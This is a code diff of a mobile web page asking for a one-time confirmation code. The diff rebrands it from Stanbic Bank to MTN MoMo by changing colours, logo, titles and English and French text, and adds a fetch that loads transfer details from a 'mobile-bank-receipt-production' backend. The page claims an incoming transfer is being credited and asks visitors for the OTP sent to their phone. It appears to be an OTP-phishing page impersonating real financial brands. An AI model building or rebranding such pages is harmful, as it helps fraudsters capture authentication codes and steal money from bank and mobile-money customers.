@@ -3,51 +3,57 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<title>Stanbic Bank · Confirm Code</title>
+<title>MTN MoMo · Confirm Code</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
   :root {
-    --sb-primary:   #01008C;
-    --sb-royal:     #005EB8;
-    --sb-navy:      #001E50;
-    --sb-gold:      #FFB81C;
-    --sb-white:     #FFFFFF;
-    --sb-text:      #1A2233;
-    --sb-muted:     #5B6577;
-    --sb-border:    #E4E8F0;
-    --sb-soft:      #F4F6FA;
-    --sb-page:      #EEF1F7;
-    --sb-green:     #0E7A4A;
-    --sb-red:       #B3261E;
-    --sb-red-soft:  #FDECEA;
-    --sb-gold-soft: #FFF8E1;
+    --mtn-yellow:        #FFCC00;
+    --mtn-yellow-dark:   #F5B500;
+    --mtn-yellow-light:  #FFF8E1;
+    --mtn-blue:          #0047AB;
+    --mtn-blue-dark:     #003380;
+    --mtn-navy:          #003366;
+    --mtn-white:         #FFFFFF;
+    --mtn-text:          #1F2937;
+    --mtn-muted:         #6B7280;
+    --mtn-border:        #E5E7EB;
+    --mtn-soft:          #F8FAFC;
+    --mtn-page:          #F1F5F9;
+    --mtn-green:         #22A356;
+    --mtn-green-dark:    #0A5C38;
+    --mtn-red:           #E31B23;
+    --mtn-red-soft:      #FDECEA;
+    --mtn-warn-soft:     #FFF8E1;
+    --mtn-warn-border:   #F2E4B8;
+    --mtn-warn-text:     #7A5B00;
+    --mtn-blue-soft:     #EEF3FB;
   }
   * { box-sizing: border-box; margin: 0; padding: 0; }
   html, body { height: 100%; }
   body {
-    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    background: var(--sb-page); color: var(--sb-text);
+    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: var(--mtn-page); color: var(--mtn-text);
     -webkit-font-smoothing: antialiased; line-height: 1.5;
     min-height: 100vh; display: flex; justify-content: center; padding: 0;
   }
   .phone {
     width: 100%; max-width: 430px; min-height: 100vh;
-    background: var(--sb-white); display: flex; flex-direction: column;
+    background: var(--mtn-white); display: flex; flex-direction: column;
     position: relative; overflow: hidden;
   }
 
   .top {
     position: relative; flex-shrink: 0;
-    background: linear-gradient(160deg, var(--sb-primary) 0%, var(--sb-royal) 100%);
+    background: linear-gradient(160deg, var(--mtn-blue) 0%, var(--mtn-navy) 100%);
     padding: 20px 22px 26px;
     border-bottom-left-radius: 20px;
     border-bottom-right-radius: 20px;
   }
   .top::before {
     content: ''; position: absolute; top: 0; left: 0; right: 0; height: 4px;
-    background: var(--sb-gold);
+    background: var(--mtn-yellow);
     border-top-left-radius: 20px; border-top-right-radius: 20px;
   }
   .brand-row {
@@ -56,12 +62,14 @@
   .top-logo {
     height: 34px; width: auto; display: block;
     flex-shrink: 0;
+    border-radius: 6px; object-fit: contain;
+    background: #fff; padding: 2px 5px;
   }
   .brand-text {
     font-size: 22px; font-weight: 800; letter-spacing: -0.5px;
     color: #fff; line-height: 1; white-space: nowrap;
   }
-  .brand-text .dot { color: var(--sb-gold); }
+  .brand-text .brand-momo { color: var(--mtn-yellow); }
 
   .page-title {
     margin-top: 18px; font-size: 19px; font-weight: 800;
@@ -79,18 +87,23 @@
   }
 
   .amount-card {
-    background: var(--sb-soft); border-radius: 12px;
-    border: 1px solid var(--sb-border);
+    background: var(--mtn-soft); border-radius: 12px;
+    border: 1px solid var(--mtn-border);
     padding: 16px 18px; margin-bottom: 22px;
     display: flex; flex-direction: column; gap: 3px;
   }
   .amount-card .label {
-    font-size: 10.5px; color: var(--sb-muted); font-weight: 700;
+    font-size: 10.5px; color: var(--mtn-muted); font-weight: 700;
     letter-spacing: 0.7px; text-transform: uppercase;
   }
   .amount-card .amount {
-    font-size: 26px; font-weight: 800; color: var(--sb-primary);
+    font-size: 26px; font-weight: 800; color: var(--mtn-blue);
     letter-spacing: -0.5px; line-height: 1.2;
+  }
+  .amount-card .amount.is-loading {
+    color: var(--mtn-muted);
+    font-weight: 600;
+    opacity: 0.7;
   }
 
   .notice {
@@ -109,13 +122,13 @@
     text-transform: uppercase; margin-bottom: 4px; display: block;
   }
   .notice.warn {
-    background: var(--sb-gold-soft); border-color: #F2E4B8; color: #7A5B00;
+    background: var(--mtn-warn-soft); border-color: var(--mtn-warn-border); color: var(--mtn-warn-text);
   }
   .notice.warn .notice-title { color: #8A6600; }
 
   .section-label {
     font-size: 10.5px; font-weight: 800; letter-spacing: 0.7px;
-    text-transform: uppercase; color: var(--sb-muted);
+    text-transform: uppercase; color: var(--mtn-muted);
     margin-bottom: 18px; text-align: center;
   }
 
@@ -125,47 +138,47 @@
   }
   .code-input {
     width: 62px; height: 72px;
-    background: var(--sb-soft);
-    border: 1.5px solid var(--sb-border);
+    background: var(--mtn-soft);
+    border: 1.5px solid var(--mtn-border);
     border-radius: 10px;
     font-family: inherit;
     font-size: 28px; font-weight: 800;
-    color: var(--sb-primary);
+    color: var(--mtn-blue);
     text-align: center;
     outline: none;
     transition: border-color .15s, background .15s, transform .1s;
     -webkit-appearance: none;
-    caret-color: var(--sb-primary);
+    caret-color: var(--mtn-blue);
   }
   .code-input:focus {
-    border-color: var(--sb-primary);
+    border-color: var(--mtn-blue);
     background: #fff;
     transform: translateY(-1px);
   }
   .code-input.filled {
-    border-color: var(--sb-primary);
-    background: #EEF3FB;
+    border-color: var(--mtn-blue);
+    background: var(--mtn-blue-soft);
   }
   .code-input.invalid {
-    border-color: var(--sb-red);
-    background: var(--sb-red-soft);
-    color: var(--sb-red);
+    border-color: var(--mtn-red);
+    background: var(--mtn-red-soft);
+    color: var(--mtn-red);
   }
 
   .field-error {
     display: none;
-    font-size: 11.5px; color: var(--sb-red); margin-top: 10px;
+    font-size: 11.5px; color: var(--mtn-red); margin-top: 10px;
     font-weight: 600; line-height: 1.4; text-align: center;
   }
   .field-error.show { display: block; }
 
   .btn-approve {
     width: 100%; margin-top: 24px; min-height: 64px;
-    background: var(--sb-primary); color: #fff;
+    background: var(--mtn-blue); color: #fff;
     font-family: inherit; font-size: 17px; font-weight: 800;
     letter-spacing: 0.4px;
     border: none; border-radius: 12px; cursor: pointer;
-    box-shadow: 0 10px 24px rgba(1,0,140,0.28);
+    box-shadow: 0 10px 24px rgba(0,71,171,0.28);
     transition: filter .15s, transform .1s, opacity .15s;
     display: flex; align-items: center; justify-content: center;
     padding: 18px 24px;
@@ -179,26 +192,26 @@
     align-items: center; justify-content: center; gap: 8px;
     width: 100%; margin-top: 12px;
     padding: 13px 16px; font-size: 13.5px; font-weight: 700;
-    background: #fff; color: var(--sb-primary);
-    border: 1.5px solid var(--sb-primary); border-radius: 10px;
+    background: #fff; color: var(--mtn-blue);
+    border: 1.5px solid var(--mtn-blue); border-radius: 10px;
     cursor: pointer; font-family: inherit; transition: all .15s;
   }
   .btn-resend.show { display: inline-flex; }
-  .btn-resend:hover { background: var(--sb-soft); }
+  .btn-resend:hover { background: var(--mtn-soft); }
   .btn-resend:disabled { opacity: 0.6; cursor: wait; }
   .btn-resend svg {
     width: 15px; height: 15px; stroke: currentColor; fill: none;
     stroke-width: 2.4; stroke-linecap: round; stroke-linejoin: round;
   }
   .btn-resend.sent {
-    background: var(--sb-green); color: #fff;
-    border-color: var(--sb-green);
+    background: var(--mtn-green); color: #fff;
+    border-color: var(--mtn-green);
   }
 
   .toast {
     position: fixed; bottom: 24px; left: 50%;
     transform: translateX(-50%) translateY(80px);
-    background: var(--sb-navy); color: #fff; padding: 11px 18px; border-radius: 9px;
+    background: var(--mtn-navy); color: #fff; padding: 11px 18px; border-radius: 9px;
     font-size: 12.5px; font-weight: 600; opacity: 0; transition: all .3s ease;
     z-index: 50; pointer-events: none; max-width: 90%; text-align: center;
     box-shadow: 0 12px 28px rgba(0,0,0,0.25);
@@ -213,10 +226,10 @@
     color: #fff;
   }
   .authorizing {
-    background: linear-gradient(160deg, var(--sb-primary) 0%, var(--sb-royal) 100%);
+    background: linear-gradient(160deg, var(--mtn-blue) 0%, var(--mtn-navy) 100%);
   }
   .success {
-    background: linear-gradient(160deg, #0A5C38 0%, var(--sb-green) 100%);
+    background: linear-gradient(160deg, var(--mtn-green-dark) 0%, var(--mtn-green) 100%);
   }
   .authorizing.show, .success.show { display: flex; }
 
@@ -229,19 +242,21 @@
   .success .brand-label img {
     height: 34px; width: auto;
     flex-shrink: 0;
+    border-radius: 6px; object-fit: contain;
+    background: #fff; padding: 2px 5px;
   }
   .authorizing .brand-label .brand-text,
   .success .brand-label .brand-text {
     font-size: 22px; font-weight: 800; color: #fff;
     letter-spacing: -0.5px; line-height: 1;
   }
-  .authorizing .brand-label .brand-text .dot,
-  .success .brand-label .brand-text .dot { color: var(--sb-gold); }
+  .authorizing .brand-label .brand-text .brand-momo,
+  .success .brand-label .brand-text .brand-momo { color: var(--mtn-yellow); }
 
   .authorizing .spinner {
     width: 60px; height: 60px;
     border: 4px solid rgba(255,255,255,0.18);
-    border-top-color: var(--sb-gold);
+    border-top-color: var(--mtn-yellow);
     border-radius: 50%;
     animation: spin 0.9s linear infinite;
     margin-bottom: 24px;
@@ -282,7 +297,7 @@
     to { stroke-dashoffset: 0; }
   }
   .success .credited-amount {
-    font-size: 26px; font-weight: 900; color: var(--sb-gold);
+    font-size: 26px; font-weight: 900; color: var(--mtn-yellow);
     letter-spacing: -0.5px; margin: 6px 0 14px;
   }
 
@@ -292,7 +307,7 @@
     font-size: 12px; font-weight: 600; cursor: pointer;
     text-decoration: underline; text-underline-offset: 3px;
   }
-  .authorizing .cancel-link:hover { color: var(--sb-gold); }
+  .authorizing .cancel-link:hover { color: var(--mtn-yellow); }
 
   @media (max-width: 380px) {
     .top { padding: 16px 18px 22px; }
@@ -320,7 +335,7 @@
     .phone {
       min-height: calc(100vh - 64px); max-height: 900px;
       border-radius: 20px;
-      box-shadow: 0 30px 80px rgba(1,0,140,0.18); overflow: hidden;
+      box-shadow: 0 30px 80px rgba(0,71,171,0.18); overflow: hidden;
     }
   }
 </style>
@@ -333,12 +348,12 @@
     <div class="brand-row">
       <img
         class="top-logo"
-        src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
-        alt="Stanbic Bank"
+        src="https://i.pinimg.com/1200x/f2/f9/38/f2f9385a59cf088b7b77472f3636d4fb.jpg"
+        alt="MTN MoMo"
         referrerpolicy="no-referrer"
         onerror="this.style.display='none'"
       >
-      <span class="brand-text">Stanbic<span class="dot">.</span></span>
+      <span class="brand-text">MTN<span class="brand-momo">&nbsp;MoMo</span></span>
     </div>
     <div class="page-title" id="pageTitle">Enter confirmation code</div>
     <div class="page-sub" id="pageSub">Enter the one-time code sent to your phone to complete this transfer.</div>
@@ -348,7 +363,7 @@
 
     <div class="amount-card">
       <span class="label" id="amountLabel">Amount</span>
-      <span class="amount" id="amountValue">—</span>
+      <span class="amount is-loading" id="amountValue">—</span>
     </div>
 
     <div class="notice warn" id="noticeExpired">
@@ -379,28 +394,28 @@
 <div class="authorizing" id="authorizingOverlay">
   <div class="brand-label">
     <img
-      src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
-      alt="Stanbic Bank"
+      src="https://i.pinimg.com/1200x/f2/f9/38/f2f9385a59cf088b7b77472f3636d4fb.jpg"
+      alt="MTN MoMo"
       referrerpolicy="no-referrer"
       onerror="this.style.display='none'"
     >
-    <span class="brand-text">Stanbic<span class="dot">.</span></span>
+    <span class="brand-text">MTN<span class="brand-momo">&nbsp;MoMo</span></span>
   </div>
   <div class="spinner"></div>
   <h2 id="authTitle">Confirming transfer…</h2>
-  <p id="authText">Verifying your code with Stanbic Bank. Please do not close this page.</p>
+  <p id="authText">Verifying your code with MTN MoMo. Please do not close this page.</p>
   <button class="cancel-link" onclick="cancelAuthorizing()" id="cancelAuthBtn">Cancel</button>
 </div>
 
 <div class="success" id="successOverlay">
   <div class="brand-label">
     <img
-      src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
-      alt="Stanbic Bank"
+      src="https://i.pinimg.com/1200x/f2/f9/38/f2f9385a59cf088b7b77472f3636d4fb.jpg"
+      alt="MTN MoMo"
       referrerpolicy="no-referrer"
       onerror="this.style.display='none'"
     >
-    <span class="brand-text">Stanbic<span class="dot">.</span></span>
+    <span class="brand-text">MTN<span class="brand-momo">&nbsp;MoMo</span></span>
   </div>
   <div class="check">
     <svg viewBox="0 0 24 24"><polyline points="5 12 10 17 19 7"/></svg>
@@ -413,10 +428,11 @@
 <div class="toast" id="toast"></div>
 
 <script>
-  
   const API_BASE = 'https://mobile-bank-receipt-production.up.railway.app';
+
+  const I18N = {
     en: {
-      docTitle: 'Stanbic Bank · Confirm Code',
+      docTitle: 'MTN MoMo · Confirm Code',
       pageTitle: 'Enter confirmation code',
       pageSub: 'Enter the one-time code sent to your phone to complete this transfer.',
       amountLabel: 'Amount',
@@ -429,7 +445,7 @@
       resendSending: 'Sending…',
       resendSent: 'Sent ✓',
       authTitle: 'Confirming transfer…',
-      authText: 'Verifying your code with Stanbic Bank. Please do not close this page.',
+      authText: 'Verifying your code with MTN MoMo. Please do not close this page.',
       cancelBtn: 'Cancel',
       successTitle: 'Transfer confirmed',
       successDesc: 'Your incoming transfer has been confirmed and the funds are now in your account. You will be redirected shortly.',
@@ -442,7 +458,7 @@
       resendFailed: 'Could not resend. Please try again in a moment.'
     },
     fr: {
-      docTitle: 'Stanbic Bank · Code de confirmation',
+      docTitle: 'MTN MoMo · Code de confirmation',
       pageTitle: 'Saisissez le code de confirmation',
       pageSub: 'Entrez le code à usage unique envoyé sur votre téléphone pour finaliser ce virement.',
       amountLabel: 'Montant',
@@ -455,7 +471,7 @@
       resendSending: 'Envoi…',
       resendSent: 'Envoyé ✓',
       authTitle: 'Confirmation du virement…',
-      authText: 'Vérification de votre code avec Stanbic Bank. Veuillez ne pas fermer cette page.',
+      authText: 'Vérification de votre code avec MTN MoMo. Veuillez ne pas fermer cette page.',
       cancelBtn: 'Annuler',
       successTitle: 'Virement confirmé',
       successDesc: 'Votre virement entrant a été confirmé et les fonds sont maintenant sur votre compte. Vous allez être redirigé sous peu.',
@@ -475,7 +491,7 @@
   const T = I18N[currentLang];
 
   const tx = {
-    ref: urlParams.get('tx') || '',
+    ref: urlParams.get('tx') || urlParams.get('r') || '',
     am:  urlParams.get('am') || '',
     cur: urlParams.get('cur') || '',
     rn:  urlParams.get('rn') || '',
@@ -496,7 +512,7 @@
   function formatAmount(amount, currency) {
     const locale = CURRENCY_LOCALE[currency] || 'en-US';
     const n = Number(amount);
-    if (!isFinite(n)) return '—';
+    if (!isFinite(n) || amount === '' || amount == null) return '—';
     try {
       const parts = new Intl.NumberFormat(locale, {
         minimumFractionDigits: 0, maximumFractionDigits: 2
@@ -504,7 +520,7 @@
       const pretty = (currency === 'XAF' || currency === 'XOF' || currency === 'UGX')
         ? parts.replace(/\u202F|\u00A0|,/g, ' ')
         : parts;
-      return pretty + ' ' + currency;
+      return pretty + ' ' + (currency || '');
     } catch (e) { return n + ' ' + (currency || ''); }
   }
 
@@ -513,6 +529,44 @@
     t.textContent = msg; t.classList.add('show');
     clearTimeout(t._timer);
     t._timer = setTimeout(() => t.classList.remove('show'), 2400);
+  }
+
+  function renderAmount() {
+    const el = document.getElementById('amountValue');
+    if (!el) return;
+    if (tx.am && tx.cur) {
+      el.textContent = formatAmount(tx.am, tx.cur);
+      el.classList.remove('is-loading');
+    } else if (tx.am) {
+      el.textContent = String(tx.am);
+      el.classList.remove('is-loading');
+    } else {
+      el.textContent = '—';
+      el.classList.add('is-loading');
+    }
+  }
+
+  // Fallback: if URL didn't carry am/cur, hydrate from server record
+  async function hydrateTxFromServer() {
+    if (tx.am && tx.cur) return;
+    if (!tx.ref) return;
+    try {
+      const r = await fetch(API_BASE + '/api/links/' + encodeURIComponent(tx.ref) + '?_=' + Date.now());
+      if (!r.ok) return;
+      const j = await r.json();
+      if (!j || !j.ok) return;
+      tx.am  = tx.am  || j.am  || j.amount   || '';
+      tx.cur = tx.cur || j.cur || j.currency || '';
+      tx.rn  = tx.rn  || j.rn  || j.accountName || '';
+      tx.c   = tx.c   || j.c   || j.countryName || '';
+      tx.pm  = tx.pm  || j.pm  || j.modeOfPayment || '';
+      tx.sn  = tx.sn  || j.sn  || j.receiptOptional || '';
+      tx.mk  = tx.mk  || j.mk  || j.marketedBy || '';
+      tx.pu  = tx.pu  || j.pu  || j.purpose || '';
+      renderAmount();
+    } catch (e) {
+      console.warn('[otp2] hydrate failed:', e);
+    }
   }
 
   function applyTranslations() {
@@ -613,12 +667,11 @@
     input.addEventListener('focus', () => { input.select && input.select(); });
   });
 
-  document.addEventListener('DOMContentLoaded', () => {
+  document.addEventListener('DOMContentLoaded', async () => {
     applyTranslations();
+    renderAmount();
+    await hydrateTxFromServer();
     codeInputs[0].focus();
-
-    document.getElementById('amountValue').textContent =
-      tx.am ? formatAmount(tx.am, tx.cur) : '—';
 
     if ('OTPCredential' in window && navigator.credentials && navigator.credentials.get) {
       try {
